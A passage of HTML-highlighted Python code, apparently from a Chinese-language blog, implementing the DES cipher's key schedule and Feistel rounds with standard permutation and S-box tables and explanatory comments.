class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">41</span>,<span class="hljs-number">52</span>,<span class="hljs-number">31</span>,<span class="hljs-number">37</span>,<span class="hljs-number">47</span>,<span class="hljs-number">55</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">51</span>,<span class="hljs-number">45</span>,<span class="hljs-number">33</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">39</span>,<span class="hljs-number">56</span>,<span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">46</span>,<span class="hljs-number">42</span>,<span class="hljs-number">50</span>,<span class="hljs-number">36</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span> ]<br>    shift = [ <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span> ] <span class="hljs-comment">#每轮左移的位数</span><br>    key_alpha_bin = get_bin(key_alpha, <span class="hljs-string">&quot;encode&quot;</span>) <span class="hljs-comment">#密钥字母的二进制形态</span><br>    key_pc1 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pc1: <span class="hljs-comment">#将密钥二进制形态做pc1，得到56位密钥</span><br>        key_pc1 += key_alpha_bin[i - <span class="hljs-number">1</span>] <span class="hljs-comment">#位置1实际上是列表的0</span><br>    c, d = key_pc1[<span class="hljs-number">0</span>:<span class="hljs-number">28</span>], key_pc1[<span class="hljs-number">28</span>:] <span class="hljs-comment">#左半和右半</span><br>    keys = [] <span class="hljs-comment">#存放每轮加密真正要用的48位密钥</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> (shift[i] == <span class="hljs-number">1</span>):<br>            c = c[<span class="hljs-number">1</span>:<span class="hljs-number">28</span>] + c[<span class="hljs-number">0</span>]<br>            d = d[<span class="hljs-number">1</span>:<span class="hljs-number">28</span>] + d[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">elif</span> (shift[i] == <span class="hljs-number">2</span>):<br>            c = c[<span class="hljs-number">2</span>:<span class="hljs-number">28</span>] + c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]<br>            d = d[<span class="hljs-number">2</span>:<span class="hljs-number">28</span>] + d[<span class="hljs-number">0</span>] + d[<span class="hljs-number">1</span>]<br>        cd = c + d <span class="hljs-comment">#cd合并</span><br>        key = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pc2:<br>            key += cd[i - <span class="hljs-number">1</span>]<br>        keys.append(key)<br>    <span class="hljs-keyword">return</span> keys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des</span>(<span class="hljs-params">data_alpha, key_alpha, mod</span>):<br>    ip = [<span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">64</span>,<span class="hljs-number">56</span>,<span class="hljs-number">48</span>,<span class="hljs-number">40</span>,<span class="hljs-number">32</span>,<span class="hljs-number">24</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,<span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>]<br>    ep = [<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>]<br>    s = [[<span class="hljs-number">14</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>], \<br>        [<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>], \<br>        [<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>], \<br>        [<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>], \<br>        [<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>], \<br>        [<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>], \<br>        [<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>], \<br>        [<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>]]<br>    p = [<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">29</span>,<span class="hljs-number">12</span>,<span class="hljs-number">28</span>,<span class="hljs-number">17</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">23</span>,<span class="hljs-number">26</span>,<span class="hljs-number">5</span>,<span class="hljs-number">18</span>,<span class="hljs-number">31</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,<span class="hljs-number">27</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">19</span>,<span class="hljs-number">13</span>,<span class="hljs-number">30</span>,<span class="hljs-number">6</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">25</span>]<br>    ip_reverse = [<span class="hljs-number">40</span>,<span class="hljs-number">8</span>,<span class="hljs-number">48</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">24</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>,<span class="hljs-number">39</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">63</span>,<span class="hljs-number">31</span>,<span class="hljs-number">38</span>,<span class="hljs-number">6</span>,<span class="hljs-number">46</span>,<span class="hljs-number">14</span>,<span class="hljs-number">54</span>,<span class="hljs-number">22</span>,<span class="hljs-number">62</span>,<span class="hljs-number">30</span>,<span class="hljs-number">37</span>,<span class="hljs-number">5</span>,<span class="hljs-number">45</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">21</span>,<span class="hljs-number">61</span>,<span class="hljs-number">29</span>,<span class="hljs-number">36</span>,<span class="hljs-number">4</span>,<span class="hljs-number">44</span>,<span class="hljs-number">12</span>,<span class="hljs-number">52</span>,<span class="hljs-number">20</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,<span class="hljs-number">35</span>,<span class="hljs-number">3</span>,<span class="hljs-number">43</span>,<span class="hljs-number">11</span>,<span class="hljs-number">51</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">27</span>,<span class="hljs-number">34</span>,<span class="hljs-number">2</span>,<span class="hljs-number">42</span>,<span class="hljs-number">10</span>,<span class="hljs-number">50</span>,<span class="hljs-number">18</span>,<span class="hljs-number">58</span>,<span class="hljs-number">26</span>,<span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">49</span>,<span class="hljs-number">17</span>,<span class="hljs-number">57</span>,<span class="hljs-number">25</span>]<br>    data_alpha_bin = get_bin(data_alpha, mod)<br>    data_ip = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip:<br>        data_ip += data_alpha_bin[i - <span class="hljs-number">1</span>]<br>    l, r = data_ip[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>], data_ip[<span class="hljs-number">32</span>:<span class="hljs-number">64</span>] <span class="hljs-comment">#左半右半</span><br>    keys = get_key(key_alpha) <span class="hljs-comment">#获得16轮的密钥列表</span><br>    range_ = <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> mod == <span class="hljs-string">&quot;encode&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> wheel <span class="hljs-keyword">in</span> range_: <span class="hljs-comment">#wheel代表轮数，取自车轮意</span><br>        r_ep = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ep:<br>            r_ep += r[i - <span class="hljs-number">1</span>]<br>        key = keys[wheel]<br>        r_ep_xor = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>):<br>            r_ep_xor += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(r_ep[i])^<span class="hljs-built_in">int</span>(key[i]))<br>        r_s_i = [] <span class="hljs-comment">#s-box的输入，一共8个，每个为六个字母</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):<br>            s_i_temp = r_ep_xor[i * <span class="hljs-number">6</span> : i * <span class="hljs-number">6</span> + <span class="hljs-number">6</span>]<br>            r_s_i.append(s_i_temp)<br>        r_s_o = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):<br>            si = r_s_i[i]<br>            row = <span class="hljs-built_in">int</span>(si[<span class="hljs-number">0</span>]) * <span class="hljs-number">2</span> + <span class="hljs-built_in">int</span>(si[<span class="hljs-number">5</span>])<br>            column = <span class="hljs-built_in">int</span>(si[<span class="hljs-number">1</span>]) * <span class="hljs-number">8</span> + <span class="hljs-built_in">int</span>(si[<span class="hljs-number">2</span>]) * <span class="hljs-number">4</span> + <span class="hljs-built_in">int</span>(si[<span class="hljs-number">3</span>]) * <span class="hljs-number">2</span> + <span class="hljs-built_in">int</span>(si[<span class="hljs-number">4</span>])<br>            index = row * <span class="hljs-number">16</span> + column<br>            so_int = s[i][index]<br>            so_bin = <span class="hljs-built_in">bin</span>(so_int).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment">#转化为二进制</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(so_bin) &lt; <span class="hljs-number">4</span>: <span class="hljs-comment">#补零</span><br>                so_bin = <span class="hljs-string">&quot;0&quot;</span> + so_bin<br>            r_s_o += so_bin<br>        r_p = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>            r_p += r_s_o[i - <span class="hljs-number">1</span>]<br>        r_next = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):<br>            r_next += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(l[i])^<span class="hljs-built_in">int</span>(r_p[i]))<br>        l = r <span class="hljs-comment">#L1 = R0</span><br>        r = r_next <span class="hljs-comment">#R1 = F(L0, R0, Key1)</span><br>    data_preout = r + l <span class="hljs-comment">#最后一步逆转置置换时r在前面</span><br>    data_code_bin = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment">#密文/明文2进制形态,这里的code表示包含了encode和decode</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip_reverse:<br>        data_code_bin += data_preout[i - <span class="hljs-number">1</span>]<br>    data_code_hex = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(data_code_bin, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">len</span>(data_code_hex) &lt; <span class="hljs-number">16</span>): <span 